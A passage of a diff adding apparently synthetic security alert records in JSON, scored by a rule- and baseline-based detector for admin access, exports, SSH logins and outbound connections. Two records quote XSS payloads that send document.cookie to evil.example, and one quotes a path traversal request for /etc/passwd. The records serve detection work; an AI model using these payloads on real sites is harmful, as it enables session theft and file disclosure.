+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "baseline_history",
+        "profile_group": "why",
+        "expected": "sufficient_user_baseline",
+        "actual": "confidence 0.54, sample_days 1",
+        "deviation_type": "low_baseline_confidence",
+        "severity": "low",
+        "confidence": 0.54,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "admin_resource_access",
+      "maintenance_window",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "resource": "/admin/login.php",
+      "user_id": "ops_zhang",
+      "risk_mitigations": [
+        "maintenance_window",
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261029-0302"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.090583Z",
+    "related_logs_summary": "user=ops_zhang src_ip=10.0.0.66 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "c646cb54-efdd-4c7d-afcc-d2d3bcfb9860",
+    "event_time": "2026-11-03T09:14:20Z",
+    "detect_time": "2026-11-17T09:29:31.097287Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "198.51.100.61",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "api_call",
+    "object_type": "uri",
+    "object_id": "/comment.php",
+    "attack_type": "XSS",
+    "risk_score": 40.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 15,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "URI/载荷包含XSS特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "xss_attempt"
+    ],
+    "evidence": {
+      "src_ip": "198.51.100.61",
+      "uri": "/comment.php /comment.php",
+      "payload": "content=<script>new Image().src='//evil.example/c?c='+document.cookie</script>&post=88",
+      "matched": "<script"
+    },
+    "related_event_ids": [
+      "LOG-20261103-0404"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.097287Z",
+    "related_logs_summary": "user=unknown src_ip=198.51.100.61 action=api_call result=success resource=/comment.php"
+  },
+  {
+    "event_id": "e43fe019-aa95-4e78-90f1-3aee67279d99",
+    "event_time": "2026-11-03T09:14:25Z",
+    "detect_time": "2026-11-17T09:29:31.097341Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "198.51.100.61",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "api_call",
+    "object_type": "uri",
+    "object_id": "/feedback.php",
+    "attack_type": "XSS",
+    "risk_score": 40.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 15,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "URI/载荷包含XSS特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "xss_attempt"
+    ],
+    "evidence": {
+      "src_ip": "198.51.100.61",
+      "uri": "/feedback.php /feedback.php",
+      "payload": "msg=<img src=x onerror=fetch('//evil.example/s?c='+document.cookie)>&uid=",
+      "matched": "onerror="
+    },
+    "related_event_ids": [
+      "LOG-20261103-0405"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.097341Z",
+    "related_logs_summary": "user=unknown src_ip=198.51.100.61 action=api_call result=success resource=/feedback.php"
+  },
+  {
+    "event_id": "anom-e8c98da0112141371d5a2a45e3dbaffc",
+    "event_time": "2026-11-03T09:15:00Z",
+    "detect_time": "2026-11-17T09:29:31.091211Z",
+    "tenant_id": "default",
+    "user_id": "ops_li",
+    "src_ip": "10.0.0.45",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/dashboard.php",
+    "attack_type": "privilege_abuse",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 10,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "admin_resource_access",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "resource": "/admin/dashboard.php",
+      "user_id": "ops_li",
+      "risk_mitigations": [
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261103-0406"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.091211Z",
+    "related_logs_summary": "user=ops_li src_ip=10.0.0.45 action=admin_access result=success resource=/admin/dashboard.php"
+  },
+  {
+    "event_id": "anom-f38312701d7dea5e37e993041d189bd4",
+    "event_time": "2026-11-03T09:16:30Z",
+    "detect_time": "2026-11-17T09:29:31.091337Z",
+    "tenant_id": "default",
+    "user_id": "ops_li",
+    "src_ip": "10.0.0.45",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/order_list.php",
+    "attack_type": "privilege_abuse",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 10,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "admin_resource_access",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "resource": "/admin/order_list.php",
+      "user_id": "ops_li",
+      "risk_mitigations": [
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261103-0408"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.091337Z",
+    "related_logs_summary": "user=ops_li src_ip=10.0.0.45 action=admin_access result=success resource=/admin/order_list.php"
+  },
+  {
+    "event_id": "anom-7d1389345e7e029838292c69c75e382a",
+    "event_time": "2026-11-03T09:17:00Z",
+    "detect_time": "2026-11-17T09:29:31.091419Z",
+    "tenant_id": "default",
+    "user_id": "ops_li",
+    "src_ip": "198.51.100.61",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/dashboard.php",
+    "attack_type": "privilege_abuse",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 10,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "admin_resource_access",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "resource": "/admin/dashboard.php",
+      "user_id": "ops_li",
+      "risk_mitigations": [
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261103-0409"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.091419Z",
+    "related_logs_summary": "user=ops_li src_ip=198.51.100.61 action=admin_access result=success resource=/admin/dashboard.php"
+  },
+  {
+    "event_id": "anom-55de7a52694356c4ccb1cb96c7ee063a",
+    "event_time": "2026-11-03T09:17:20Z",
+    "detect_time": "2026-11-17T09:29:31.091498Z",
+    "tenant_id": "default",
+    "user_id": "ops_li",
+    "src_ip": "198.51.100.61",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/user_list.php",
+    "attack_type": "privilege_abuse",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 10,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "admin_resource_access",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "resource": "/admin/user_list.php",
+      "user_id": "ops_li",
+      "risk_mitigations": [
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261103-0410"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.091498Z",
+    "related_logs_summary": "user=ops_li src_ip=198.51.100.61 action=admin_access result=success resource=/admin/user_list.php"
+  },
+  {
+    "event_id": "anom-b25bbdad3b18489597648b11f499bc54",
+    "event_time": "2026-11-03T09:17:40Z",
+    "detect_time": "2026-11-17T09:29:31.091573Z",
+    "tenant_id": "default",
+    "user_id": "ops_li",
+    "src_ip": "198.51.100.61",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "export",
+    "object_type": "uri",
+    "object_id": "/admin/export.php?table=users",
+    "attack_type": "data_exfiltration",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "下载或导出行为异常"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "download_volume_spike",
+      "sensitive_resource_access",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "user_id": "ops_li",
+      "resource": "/admin/export.php?table=users",
+      "action": "export",
+      "risk_mitigations": [
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261103-0411"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.091573Z",
+    "related_logs_summary": "user=ops_li src_ip=198.51.100.61 action=export result=success resource=/admin/export.php?table=users"
+  },
+  {
+    "event_id": "anom-29169188e91975e450e75562004065e3",
+    "event_time": "2026-11-03T09:17:40Z",
+    "detect_time": "2026-11-17T09:29:31.091649Z",
+    "tenant_id": "default",
+    "user_id": "ops_li",
+    "src_ip": "198.51.100.61",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "export",
+    "object_type": "uri",
+    "object_id": "/admin/export.php?table=users",
+    "attack_type": "privilege_abuse",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 10,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "admin_resource_access",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "resource": "/admin/export.php?table=users",
+      "user_id": "ops_li",
+      "risk_mitigations": [
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261103-0411"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.091649Z",
+    "related_logs_summary": "user=ops_li src_ip=198.51.100.61 action=export result=success resource=/admin/export.php?table=users"
+  },
+  {
+    "event_id": "anom-530f48c4e95d72d880b9ffe0ddb32e58",
+    "event_time": "2026-11-03T09:17:40Z",
+    "detect_time": "2026-11-17T09:29:31.091618Z",
+    "tenant_id": "default",
+    "user_id": "ops_li",
+    "src_ip": "198.51.100.61",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "export",
+    "object_type": "uri",
+    "object_id": "/admin/export.php?table=users",
+    "attack_type": "sensitive_access",
+    "risk_score": 30.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "同一user_id在5分钟内敏感资源访问超阈值"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "sensitive_resource_access",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "user_id": "ops_li",
+      "sensitive_count_5m": 5,
+      "resource": "/admin/export.php?table=users",
+      "risk_mitigations": [
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261103-0411"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.091618Z",
+    "related_logs_summary": "user=ops_li src_ip=198.51.100.61 action=export result=success resource=/admin/export.php?table=users"
+  },
+  {
+    "event_id": "anom-a2afb0b6292032c686b93649f42caf60",
+    "event_time": "2026-11-03T09:18:10Z",
+    "detect_time": "2026-11-17T09:29:31.091830Z",
+    "tenant_id": "default",
+    "user_id": "ops_li",
+    "src_ip": "198.51.100.61",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/user_edit.php",
+    "attack_type": "privilege_abuse",
+    "risk_score": 60.0,
+    "risk_level": "high",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "resource",
+        "profile_group": "access",
+        "expected": [
+          "/admin/dashboard.php",
+          "/comment.php?post=88",
+          "/admin/order_list.php",
+          "/admin/user_list.php",
+          "/admin/export.php?table=users"
+        ],
+        "actual": "/admin/user_edit.php",
+        "deviation_type": "sensitive_resource_access",
+        "severity": "high",
+        "confidence": 0.61,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "admin_resource_access",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "resource": "/admin/user_edit.php",
+      "user_id": "ops_li",
+      "risk_mitigations": [
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261103-0412"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.091830Z",
+    "related_logs_summary": "user=ops_li src_ip=198.51.100.61 action=admin_access result=success resource=/admin/user_edit.php"
+  },
+  {
+    "event_id": "anom-9c4c9e09daeacf28ae59deb8c94a0fcd",
+    "event_time": "2026-11-03T09:18:10Z",
+    "detect_time": "2026-11-17T09:29:31.091734Z",
+    "tenant_id": "default",
+    "user_id": "ops_li",
+    "src_ip": "198.51.100.61",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "admin_access",
+    "object_type": "uri",
+    "object_id": "/admin/user_edit.php",
+    "attack_type": "sensitive_access",
+    "risk_score": 55.0,
+    "risk_level": "high",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "同一user_id在5分钟内敏感资源访问超阈值"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "resource",
+        "profile_group": "access",
+        "expected": [
+          "/admin/dashboard.php",
+          "/comment.php?post=88",
+          "/admin/order_list.php",
+          "/admin/user_list.php",
+          "/admin/export.php?table=users"
+        ],
+        "actual": "/admin/user_edit.php",
+        "deviation_type": "sensitive_resource_access",
+        "severity": "high",
+        "confidence": 0.61,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "sensitive_resource_access",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "user_id": "ops_li",
+      "sensitive_count_5m": 6,
+      "resource": "/admin/user_edit.php",
+      "risk_mitigations": [
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261103-0412"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.091734Z",
+    "related_logs_summary": "user=ops_li src_ip=198.51.100.61 action=admin_access result=success resource=/admin/user_edit.php"
+  },
+  {
+    "event_id": "anom-a642cd820e247eabae1c9b5d2a6f82c8",
+    "event_time": "2026-11-03T09:22:30Z",
+    "detect_time": "2026-11-17T09:29:31.092019Z",
+    "tenant_id": "default",
+    "user_id": "ops_li",
+    "src_ip": "198.51.100.61",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "logout",
+    "object_type": "uri",
+    "object_id": "/admin/logout.php",
+    "attack_type": "privilege_abuse",
+    "risk_score": 60.0,
+    "risk_level": "high",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "resource",
+        "profile_group": "access",
+        "expected": [
+          "/admin/dashboard.php",
+          "/comment.php?post=88",
+          "/admin/order_list.php",
+          "/admin/user_list.php",
+          "/admin/export.php?table=users"
+        ],
+        "actual": "/admin/logout.php",
+        "deviation_type": "sensitive_resource_access",
+        "severity": "high",
+        "confidence": 0.61,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "admin_resource_access",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "resource": "/admin/logout.php",
+      "user_id": "ops_li",
+      "risk_mitigations": [
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261103-0417"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.092019Z",
+    "related_logs_summary": "user=ops_li src_ip=198.51.100.61 action=logout result=success resource=/admin/logout.php"
+  },
+  {
+    "event_id": "14cc9bd5-7769-4300-acec-af56db4b8b31",
+    "event_time": "2026-11-03T14:41:00Z",
+    "detect_time": "2026-11-17T09:29:31.097588Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "203.0.113.147",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "export",
+    "object_type": "uri",
+    "object_id": "/download.php?file=../../../../etc/passwd",
+    "attack_type": "Path_Traversal",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "URI包含路径遍历特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "path_traversal"
+    ],
+    "evidence": {
+      "src_ip": "203.0.113.147",
+      "uri": "/download.php?file=../../../../etc/passwd /download.php?file=../../../../etc/passwd",
+      "matched": "../"
+    },
+    "related_event_ids": [
+      "LOG-20261103-0502"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.097588Z",
+    "related_logs_summary": "user=unknown src_ip=203.0.113.147 action=export result=fail resource=/download.php?file=../../../../etc/passwd"
+  },
+  {
+    "event_id": "anom-0425b3a41bf75c28e94e59d6893f4dbb",
+    "event_time": "2026-11-04T02:10:03Z",
+    "detect_time": "2026-11-17T09:29:31.092627Z",
+    "tenant_id": "default",
+    "user_id": "root",
+    "src_ip": "198.51.100.99",
+    "host": "nas-host-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "sshd",
+    "attack_type": "account_takeover",
+    "risk_score": 27.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 15,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": -8
+    },
+    "rule_hits": [
+      "新IP登录"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "baseline_history",
+        "profile_group": "why",
+        "expected": "sufficient_user_baseline",
+        "actual": "confidence 0.43, sample_days 1",
+        "deviation_type": "low_baseline_confidence",
+        "severity": "low",
+        "confidence": 0.43,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "new_source_ip",
+      "maintenance_window"
+    ],
+    "evidence": {
+      "user_id": "root",
+      "new_ip": "198.51.100.99",
+      "risk_mitigations": [
+        "maintenance_window"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261104-0602"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.092627Z",
+    "related_logs_summary": "user=root src_ip=198.51.100.99 action=login result=success resource=sshd"
+  },
+  {
+    "event_id": "anom-17aceb3bf9003d714ba3f92f64f485a6",
+    "event_time": "2026-11-04T02:10:22Z",
+    "detect_time": "2026-11-17T09:29:31.092736Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.99",
+    "host": "nas-host-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "sshd",
+    "attack_type": "account_takeover",
+    "risk_score": 27.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 15,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": -8
+    },
+    "rule_hits": [
+      "新IP登录"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_ip",
+      "maintenance_window"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "new_ip": "198.51.100.99",
+      "risk_mitigations": [
+        "maintenance_window"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261104-0604"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.092736Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.99 action=login result=success resource=sshd"
+  },
+  {
+    "event_id": "anom-4b1ea67f2baa47a8dbfb5934629980a7",
+    "event_time": "2026-11-04T02:10:42Z",
+    "detect_time": "2026-11-17T09:29:31.092854Z",
+    "tenant_id": "default",
+    "user_id": "oracle",
+    "src_ip": "198.51.100.99",
+    "host": "nas-host-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "sshd",
+    "attack_type": "account_takeover",
+    "risk_score": 27.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 15,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": -8
+    },
+    "rule_hits": [
+      "新IP登录"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "baseline_history",
+        "profile_group": "why",
+        "expected": "sufficient_user_baseline",
+        "actual": "confidence 0.43, sample_days 1",
+        "deviation_type": "low_baseline_confidence",
+        "severity": "low",
+        "confidence": 0.43,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "new_source_ip",
+      "maintenance_window"
+    ],
+    "evidence": {
+      "user_id": "oracle",
+      "new_ip": "198.51.100.99",
+      "risk_mitigations": [
+        "maintenance_window"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261104-0606"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.092854Z",
+    "related_logs_summary": "user=oracle src_ip=198.51.100.99 action=login result=success resource=sshd"
+  },
+  {
+    "event_id": "anom-e5e9a7c1fd28f1653e3e5752e6136dd4",
+    "event_time": "2026-11-04T02:11:07Z",
+    "detect_time": "2026-11-17T09:29:31.092968Z",
+    "tenant_id": "default",
+    "user_id": "test",
+    "src_ip": "198.51.100.99",
+    "host": "nas-host-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "sshd",
+    "attack_type": "account_takeover",
+    "risk_score": 27.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 15,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": -8
+    },
+    "rule_hits": [
+      "新IP登录"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "baseline_history",
+        "profile_group": "why",
+        "expected": "sufficient_user_baseline",
+        "actual": "confidence 0.43, sample_days 1",
+        "deviation_type": "low_baseline_confidence",
+        "severity": "low",
+        "confidence": 0.43,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "new_source_ip",
+      "maintenance_window"
+    ],
+    "evidence": {
+      "user_id": "test",
+      "new_ip": "198.51.100.99",
+      "risk_mitigations": [
+        "maintenance_window"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261104-0608"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.092968Z",
+    "related_logs_summary": "user=test src_ip=198.51.100.99 action=login result=success resource=sshd"
+  },
+  {
+    "event_id": "anom-703f628244dfaef6a89bd60477d2242d",
+    "event_time": "2026-11-04T02:11:32Z",
+    "detect_time": "2026-11-17T09:29:31.093074Z",
+    "tenant_id": "default",
+    "user_id": "ops",
+    "src_ip": "198.51.100.99",
+    "host": "nas-host-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "sshd",
+    "attack_type": "account_takeover",
+    "risk_score": 25.0,
+    "risk_level": "low",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 15,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "新IP登录"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_ip",
+      "maintenance_window",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "user_id": "ops",
+      "new_ip": "198.51.100.99",
+      "risk_mitigations": [
+        "maintenance_window",
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261104-0610"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.093074Z",
+    "related_logs_summary": "user=ops src_ip=198.51.100.99 action=login result=success resource=sshd"
+  },
+  {
+    "event_id": "d4e2adff-de62-4bd0-87b2-969126049a75",
+    "event_time": "2026-11-04T02:15:05Z",
+    "detect_time": "2026-11-17T09:29:31.098008Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "10.0.0.20",
+    "host": "nas-host-01",
+    "source_type": "security_device",
+    "action": "connect",
+    "object_type": "session",
+    "object_id": "45.77.128.203:9001",
+    "attack_type": "Suspicious_Outbound",
+    "risk_score": 35.0,
+    "risk_level": "medium",
